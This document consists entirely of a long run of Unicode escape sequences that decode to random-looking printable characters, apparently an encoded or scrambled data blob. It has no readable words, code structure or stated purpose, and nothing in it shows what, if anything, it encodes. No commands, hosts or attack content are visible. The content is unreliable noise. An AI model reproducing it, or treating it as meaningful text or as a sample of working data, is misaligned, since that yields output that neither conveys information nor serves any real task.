\u0059\u006e\u0061\u0054\u0059\u0033\u003f\u007e\u0049\u0032\u0041\u004a\u006a\u0064\u006f\u0076\u006e\u0047\u0058\u0062\u006e\u0041\u0027\u0032\u004d\u0030\u007a\u0063\u0035\u0066\u003e\u0030\u005d\u0036\u0044\u0076\u0058\u0022\u0056\u0039\u0055\u0032\u0024\u004a\u0072\u0036\u0062\u004c\u0028\u003c\u003d\u0032\u0077\u0075\u0036\u0044\u0057\u0034\u0050\u005d\u0076\u0046\u0029\u0032\u0078\u0043\u003d\u006d\u0037\u006a\u004d\u0069\u004b\u003a\u0078\u0025\u003b\u0052\u0034\u0029\u0038\u0033\u004d\u0047\u0066\u002d\u004c\u0035\u0052\u007b\u0045\u004e\u003a\u0070\u003c\u0039\u0047\u0066\u0077\u0058\u003d\u005b\u0072\u007a\u0052\u0071\u006b\u0065\u003b\u005e\u006f\u0032\u005d\u0047\u0031\u004b\u004a\u006e\u0055\u005e\u004f\u0056\u005a\u0042\u0073\u002b\u0026\u006a\u002c\u0027\u004e\u0055\u0040\u0034\u005e\u004c\u003f\u0046\u0052\u007d\u007a\u0068\u0028\u007c\u005d\u0047\u0043\u002a\u0047\u006c\u002e\u0027\u007e\u0071\u003b\u0036\u006c\u002b\u004d\u006e\u005a\u004a\u003d\u0056\u0052\u0055\u0059\u0046\u0039\u0078\u007d\u0059\u0022\u0069\u0060\u003b\u0062\u0031\u0038\u0050\u0079\u003c\u0033\u0054\u002b\u0031\u0055\u0033\u005e\u002c\u004f\u003f\u003d\u004b\u0071\u0023\u0035\u0035\u006a\u005c\u004e\u0076\u0052\u0025\u0026\u0053\u0068\u0070\u0022\u0049\u002e\u0067\u0058\u0041\u007b\u0025\u0053\u002c\u0041\u004d\u0052\u0043\u0057\u0025\u0058\u0020\u0042\u0033\u0035\u0041\u0045\u0021\u0023\u0024\u0028\u0064\u004f\u007c\u0025\u005d\u005f\u0073\u005c\u005f\u006f\u0074\u006c\u0047\u0049\u0043\u0044\u0045\u0030\u003a\u0058\u007a\u007e\u003f\u0072\u0056\u007a\u0072\u0052\u0057\u0042\u0079\u0051\u004e\u004f\u0021\u0036\u0070\u004d\u006f\u0041\u004d\u007e\u0045\u0040\u0022\u0079\u0065\u0077\u002b\u002d\u004c\u006b\u0050\u0048\u002c\u0062\u0055\u0024\u003b\u0055\u004e\u006f\u003c\u003c\u0058\u0023\u0064\u0020\u007e\u0021\u0078\u004f\u0072\u0067\u003b\u005b\u0069\u004f\u003c\u003b\u0027\u0077\u0066\u005a\u0052\u0037\u0076\u0025\u003a\u0058\u0039\u004f\u0071\u005a\u006e\u0051\u003c\u004a\u0027\u006a\u005b\u0027\u005a\u0030\u0069\u0062\u0063\u0062\u004b\u005a\u0056\u004e\u0028\u004d\u0068\u0044\u004e\u0048\u0076\u003d\u0062\u0078\u0052\u002a\u0075\u007d\u005f\u007a\u007e\u0036\u0076\u0047\u006f\u0037\u004e\u0025\u0025\u006b\u004a\u0043\u0066\u0078\u005e\u002c\u0029\u0022\u0037\u004c\u0028\u0071\u0057\u0049\u004b\u002f\u0051\u006f\u0048\u0057\u0039\u0061\u0048\u002c\u003e\u0065\u006b\u004e\u0035\u0037\u0027\u0035\u005e\u0030\u0020\u0028\u002f\u0043\u003b\u0052\u007a\u003f\u0078\u0067\u0074\u006b\u005c\u0028\u004f\u0057\u0050\u007c\u0022\u0041\u003c\u0052\u003f\u0044\u003c\u002e\u0076\u004a\u0076\u0051\u0045\u004f\u0036\u0050\u0067\u007b\u0043\u0062\u0034\u0045\u005c\u0057\u0031\u004b\u0066\u0064\u0075\u0025\u005b\u0028\u0030\u0039\u0030\u0064\u002a\u002b\u0062\u002b\u0022\u0069\u0034\u0061\u0062\u0074\u002b\u005b\u0073\u0072\u004a\u0066\u006b\u003a\u002f\u0077\u005f\u002c\u003f\u0033\u007e\u0059\u0020\u0063\u0031\u005a\u004c\u0035\u0036\u0056\u0025\u007c\u0042\u002e\u0072\u0041\u006b\u0061\u0046\u0067\u005f\u002d\u0053\u0060\u004c\u0045\u0072\u0066\u006d\u007a\u004b\u0060\u0076\u0074\u0031\u006a\u0070\u0068\u006f\u003c\u0059\u0064\u007d\u003c\u006e\u0044\u003c\u002f\u0051\u006d\u005d\u004e\u006d\u0041\u002c\u006c\u0044\u0031\u0071\u006b\u0025\u0027\u0057\u0021\u0045\u0037\u003a\u003e\u003f\u0079\u005a\u0063\u007a\u0065\u0038\u0049\u0063\u003f\u0062\u0056\u0027\u0026\u002e\u004a\u0052\u0033\u0042\u002d\u004e\u003b\u0075\u0050\u0040\u0041\u0022\u0034\u0035\u004a\u003c\u0065\u003d\u0040\u0027\u0075\u0054\u0079\u007d\u0077\u0069\u0058\u0044\u0074\u0036\u0023\u0047\u0048\u004b\u0031\u0077\u0033\u002f\u0032\u0079\u0053\u0026\u0057\u0051\u006c\u004e\u0058\u0026\u0028\u0064\u0047\u0058\u0042\u005e\u004d\u0024\u0026\u0056\u0029\u005c\u0021\u0040\u0066\u005f\u0036\u002b\u0039\u0066\u0049\u0075\u0054\u0062\u0039\u005e\u003a\u0069\u003a\u0030\u004d\u0027\u0050\u006d\u005a\u0052\u003d\u0021\u0057\u0077\u0034\u002e\u0064\u0020\u0027\u0044\u003d\u0063\u0030\u004a\u0035\u006d\u006f\u0027\u005c\u0056\u003d\u0067\u0021\u006a\u0045\u0041\u003b\u0023\u0039\u0043\u007d\u005d\u003b\u0059\u0066\u0079\u002b\u003d\u002f\u0048\u0021\u0043\u003a\u0034\u0034\u0039\u006e\u0070\u0035\u0045\u003d\u0061\u002e\u004d\u005d\u0078\u0033\u0064\u0077\u0040\u0033\u007c\u0065\u005b\u003f\u0035\u0056\u003b\u002a\u0061\u0039\u0051\u0077\u0041\u005c\u0073\u0077\u0043\u0023\u006c\u0067\u0079\u0052\u003a\u0022\u003d\u006f\u0053\u0059\u0036\u005a\u0023\u003e\u0061\u007c\u0048\u002d\u0056\u002a\u0051\u005e\u0060\u0035\u0022\u002c\u003b\u002d\u002f\u0055\u004d\u0034\u0032\u0025\u0029\u005c\u0061\u0043\u0034\u0030\u0034\u007b\u004f\u0052\u006d\u006a\u0056\u002e\u0078\u0027\u0049\u0074\u0044\u0052\u0076\u0031\u0066\u004e\u0077\u0049\u0051\u0024\u0061\u007a\u0052\u0060\u0072\u0046\u0030\u0049\u0053\u006d\u0051\u002c\u0057\u0032\u006c\u0032\u0039\u002d\u003e\u004b\u0035\u004a\u005c\u002f\u004d\u0035\u0059\u0044\u002d\u0044\u0022\u0068\u0023\u0059\u002b\u0029\u005b\u004d\u004f\u0044\u004f\u0024\u0062\u0034\u0053\u002c\u0064\u005c\u0046\u0073\u0029\u0022\u0078\u0076\u0022\u0037\u0047\u0021\u007c\u0020\u0073\u007a\u0053\u002c\u007c\u0060\u0058\u002b\u0039\u005d\u0033\u0024\u0052\u0038\u0041\u005c\u0020\u002a\u0056\u0047\u005c\u0022\u005d\u0062\u005a\u0036\u0029\u0039\u0059\u002e\u007a\u0021\u0028\u0068\u0043\u005d\u006d\u0041\u004c\u004d\u0038\u004b\u0034\u0022\u0032\u0061\u004d\u0022\u0036\u0070\u0031\u003e\u0076\u002a\u002a\u0046\u006f\u007a\u0063\u0059\u007e\u006d\u006c\u0027\u004a\u005e\u0049\u0069\u0045\u0048\u003f\u0023\u0058\u0072\u004e\u0067\u006a\u0066\u0076\u006f\u0043\u0078\u006e\u0067\u006a\u006c\u0037\u003f\u0036\u0026\u002d\u0062\u0020\u0025\u0032\u007e\u006a\u0078\u007b\u0021\u007d\u004f\u003a\u004c\u0047\u0036\u0076\u0023\u003b\u0037\u0057\u0033\u0035\u003c\u0049\u0067\u0034\u0022\u0078\u0069\u002f\u005e\u0029\u006a\u0054\u0027\u0044\u0036\u007a\u006e\u002d\u0048\u002d\u0052\u0028\u0067\u006f\u006a\u0062\u0078\u0033\u0063\u0061\u004f\u003b\u0020\u0027\u007b\u0026\u0044\u0058\u006e\u002a\u007d\u006f\u0057\u0067\u006a\u005e\u0029\u0060\u0037\u0031\u0022\u004f\u0079\u0056\u002c\u0052\u0072\u0069\u0059\u0041\u005c\u006b\u0053\u005e\u005c\u006f\u0042\u0054\u0074\u0038\u006b\u0050\u007a\u0037\u0052\u0067\u0026\u004f\u0078\u0031\u007d\u004a\u003a\u005d\u0033\u0075\u0039\u005f\u0061\u003a\u0044\u0039\u0048\u004b\u006f\u003a\u0065\u004b\u0079\u0053\u0057\u0037\u0034\u0021\u0056\u0046\u005c\u003f\u0026\u004e\u0034\u0040\u0045\u0075\u0025\u0020\u0052\u0043\u003c\u006c\u005f\u0022\u0079\u0078\u0048\u0055\u0037\u0044\u002f\u0044\u004c\u004f\u0057\u0025\u006a\u0065\u0029\u0056\u0068\u0030\u0042\u005b\u004e\u004d\u0049\u0057\u0054\u005a\u004e\u0021\u0043\u003a\u003a\u0070\u005a\u004a\u0052\u0039\u0042\u0028\u004f\u004e\u0069\u0022\u0030\u006c\u0053\u0050\u003f\u0033\u005c\u0068\u004c\u0061\u0046\u0055\u0030\u0053\u003a\u0046\u0052\u0047\u002b\u0070\u0062\u004f\u002b\u003d\u003d\u0048\u002d\u0077\u003c\u0024\u003e\u002c\u0042\u0077\u004e\u0071\u0061\u0053\u0062\u0034\u002a\u006f\u0035\u003c\u0056\u003e\u0057\u0021\u007c\u006e\u0039\u0055\u006d\u0036\u0029\u0046\u0040\u0077\u005d\u0020\u0065\u004f\u0076\u0038\u002a\u0061\u0073\u003b\u004c\u0029\u002f\u0035\u003a\u002e\u0024\u0046\u006c\u005c\u0050\u0064\u005e\u007a\u0046\u0036\u004b\u0041\u0035\u0021\u0049\u007d\u0031\u0035\u0059\u0043\u0054\u0074\u0040\u004b\u0035\u0022\u0052\u0061\u004c\u0075\u0064\u004b\u0076\u0073\u0042\u0065\u0053\u0059\u0034\u0050\u0056\u0036\u0025\u0024\u0074\u003d\u006b\u0064\u0066\u0058\u0058\u0041\u0044\u006f\u0062\u0030\u004d\u0077\u0073\u0028\u0029\u0022\u0076\u0027\u002b\u003c\u0059\u0054\u004d\u005c\u0079\u0025\u005e\u007a\u0026\u003b\u0028\u0042\u0078\u0031\u0021\u0045\u0048\u006e\u0070\u0034\u007d\u005d\u0047\u005b\u0077\u005f\u005a\u0049\u0030\u007d\u0063\u0062\u0058\u0049\u0031\u0041\u0050\u004a\u0070\u0073\u0064\u002e\u002d\u004f\u004f\u0021\u0047\u0031\u0051\u006e\u006c\u0070\u0057\u0067\u0049\u0052\u007c\u0073\u005c\u002e\u0065\u007e\u0027\u0052\u0066\u006a\u0025\u0040\u0050\u0052\u0057\u0035\u006f\u0027\u0049\u003a\u005c\u0040\u0058\u006c\u003c\u0032\u004a\u002f\u004d\u004d\u0056\u0038\u004a\u0052\u0076\u0062\u0043\u006c\u002a\u003d\u005b\u0031\u005d\u004c\u0039\u0032\u0068\u0036\u0049\u003b\u005e\u0047\u0051\u003d\u005e\u0021\u0034\u007b\u0030\u0058\u004b\u0047\u004b\u0057\u005e\u0033\u0034\u0057\u0061\u0070\u005f\u004e\u0020\u0054\u003c\u005b\u0073\u0073\u003e\u0024\u0073\u0075\u0034\u0048\u0064\u0059\u0029\u006d\u0059\u003c\u0040\u002e\u0065\u005a\u0044\u0024\u0023\u002a\u003a\u0060\u0061\u004d\u0021\u0023\u004c\u0055\u0038\u006f\u0071\u002e\u0056\u0075\u0071\u0039\u005f\u0055\u0031\u0055\u0022\u0028\u0059\u004c\u002f\u0056\u0073\u006b\u0027\u004d\u007b\u0073\u002b\u0028\u007c\u0066\u0069\u0074\u003f\u007d\u0060\u005d\u0033\u0062\u0020\u0070\u0058\u0030\u0072\u0024\u007c\u0047\u0028\u0030\u0068\u0024\u004c\u004e\u0032\u0035\u0020\u0056\u0073\u0020\u0041\u0045\u005f\u0079\u0069\u004b\u005e\u0069\u007a\u0037\u0045\u0038\u0068\u002c\u006f\u0040\u005b\u003e\u0037\u0078\u0028\u0041\u004f\u0056\u007c\u0042\u0073\u0060\u004f\u0059\u004d\u0075\u0072\u005b\u0051\u004b\u006b\u0071\u0021\u004b\u0074\u0030\u0056\u0052\u0077\u0036\u0079\u0047\u0076\u0071\u006a\u005b\u006f\u0040\u005b\u007a\u006c\u0075\u0062\u0050\u0073\u0071\u0059\u0053\u0043\u007a\u005d\u002f\u002b\u0072\u0064\u005b\u0056\u0072\u0041\u002b\u0038\u006e\u0033\u005e\u0065\u004d\u0047\u0049\u002b\u0079\u0025\u0041\u0067\u003a\u0057\u0050\u005e\u0029\u0079\u003b\u0047\u0028\u007e\u0060\u0047\u003f\u0028\u0071\u0062\u005c\u0053\u003f\u0062\u0073\u0043\u0065\u0077\u007b\u0073\u002a\u0077\u0062\u0064\u007e\u006b\u002d\u0055\u0068\u006c\u0049\u0051\u007c\u002f\u002a\u0021\u0043\u0053\u003b\u0039\u0035\u0041\u003c\u0045\u0050\u004e\u0033\u006a\u004d\u0022\u0040\u003e\u002e\u005d\u005d\u003b\u0023\u004e\u006f\u0049\u006e\u0076\u002b\u0069\u003f\u003c\u003f\u005e\u0062\u003a\u002b\u005c\u005b\u0047\u0030\u0035\u004f\u0078\u0021\u002a\u002a\u0079\u0054\u007b\u003f\u004f\u0047\u0028\u007b\u006c\u0041\u0029\u0028\u0045\u0078\u0076\u007b\u0031\u0028\u003f\u0028\u005c\u004f\u0072\u005e\u0073\u0074\u004e\u004e\u0046\u0074\u0045\u0044\u002e\u0030\u0035\u0024\u007a\u002e\u0071\u0035\u003e\u0021\u003f\u0052\u007e\u0035\u0051\u0025\u006b\u004a\u0076\u0074\u0031\u0061\u007b\u0065\u0028\u005a\u0021\u0059\u0045\u0058\u0059\u0021\u0067\u003b\u0036\u0044\u007c\u0067\u005c\u003c\u002f\u0052\u0045\u0069\u0072\u0026\u0037\u003a\u004a\u0041\u0072\u007d\u0053\u002a\u004b\u0029\u002c\u0066\u0034\u0074\u0061\u0037\u0052\u0074\u004b\u0068\u003a\u0062\u0046\u0047\u0026\u0048\u0024\u0068\u002b\u0061\u003d\u004c\u0022\u0051\u007d\u0064\u0035\u005a\u0062\u0027\u005a\u007a\u0065\u004e\u0079\u0069\u0053\u004b\u0031\u0046\u005c\u0047\u005d\u0076\u007c\u005d\u0062\u0079\u0078\u006c\u0022\u0077\u0064\u0032\u007a\u0032\u0067\u0079\u004e\u004a\u0038\u0057\u0030\u007a\u0029\u005a\u0042\u0050\u006d\u006b\u003f\u0020\u0034\u0067\u0057\u007e\u002c\u004b\u005f\u0029\u003c\u0038\u005b\u0060\u004a\u0067\u002e\u006d\u0067\u005c\u0070\u0020\u0046\u0076\u0071\u002f\u0055\u007c\u003c\u0039\u0071\u0072\u002a\u006e\u0028\u002b\u0051\u0055\u0032\u004d\u0067\u0076\u0074\u002a\u0064\u0022\u0036\u0064\u007d\u004c\u0024\u0047\u0049\u0030\u004a\u0068\u0067\u0069\u007a\u0025\u0064\u004e\u002b\u002e\u007a\u0027\u002a\u0075\u0069\u005b\u0038\u0070\u003e\u0040\u004e\u006d\u006c\u0071\u003a\u0071\u0037\u006c\u003a\u0029\u0077\u003e\u006c\u007b\u0021\u0043\u0049\u0040\u0071\u0036\u0068\u003d\u0062\u0026\u0031\u005d\u0076\u005c\u0073\u005a\u0025\u002b\u003f\u003b\u0047\u0077\u0046\u0063\u0022\u0054\u006a\u004d\u004e\u007b\u0049\u0041\u0072\u0031\u0069\u0033\u0034\u0042\u004a\u0041\u007e\u004c\u0038\u007b\u0033\u002b\u005b\u003d\u0074\u005b\u0065\u0054\u0079\u004f\u006d\u004b\u0024\u0070\u0038\u004f\u0022\u007b\u0043\u0025\u0037\u0063\u0038\u0032\u003c\u0028\u0048\u0045\u0057\u006b\u003a\u0030\u0074\u0029\u005e\u006d\u003a\u0074\u0071\u002a\u0079\u0047\u0025\u0023\u002b\u003d\u0042\u0064\u0052\u003c\u0038\u004e\u003d\u003c\u0030\u0034\u0042\u007e\u005d\u0060\u0064\u002c\u0029\u005f\u0055\u0060\u0043\u0062\u0072\u0029\u004b\u0032\u0068\u003e\u0028\u006f\u0051\u0027\u007e\u0028\u0075\u0067\u0035\u0072\u0077\u0053\u0055\u004c\u0048\u0063\u002b\u0032\u003f\u0039\u006e\u0054\u002a\u0061\u0057\u002b\u0076\u0033\u0060\u0078\u002f\u0024\u004b\u0043\u003e\u0043\u0078\u0073\u0057\u006c\u0032\u0020\u0050\u006f\u0033\u0046\u0021\u0033\u005f\u0065\u0030\u005a\u0067\u0057\u0020\u0030\u0067\u0051\u003d\u0066\u0072\u0079\u0073\u002d\u003e\u0024\u004d\u0079\u004c\u0026\u005c\u0064\u0078\u0024\u002f\u0064\u0067\u0077\u0049\u006b\u0076\u0025\u0065\u0031\u006d\u0057\u0057\u0053\u0046\u002c\u003d\u002b\u0047\u0020\u0037\u004a\u0031\u0065\u004d\u003d\u002d\u0048\u0071\u0021\u0066\u0020\u0040\u003f\u0028\u0035\u002d\u0042\u006a\u0058\u0037\u0075\u005f\u005a\u0045\u0067\u0073\u005e\u003a\u0052\u007b\u003b\u006b\u0045\u0062\u0024\u005e\u007a\u0071\u004f\u0072\u007a\u007a\u0053\u002f\u0035\u002d\u0055\u006f\u0034\u0064\u0049\u0064\u0063\u0042\u0044\u0033\u0054\u0066\u0067\u0063\u0040\u0058\u0069\u0030\u003e\u006c\u0053\u0076\u0062\u0055\u002f\u002e\u0050\u005e\u0024\u004c\u0033\u0064\u007a\u0069\u0060\u007e\u0035\u0067\u004b\u005b\u0057\u0074\u0041\u0042\u005b\u006c\u0068\u0079\u002f\u005a\u006d\u0043\u0062\u005b\u0068\u0065\u0023\u0056\u003d\u0072\u0071\u002d\u0034\u0027\u0057\u0038\u0059\u0072\u006c\u0023\u006f\u004f\u006f\u006a\u004a\u0065\u0038\u0028\u0056\u0040\u0036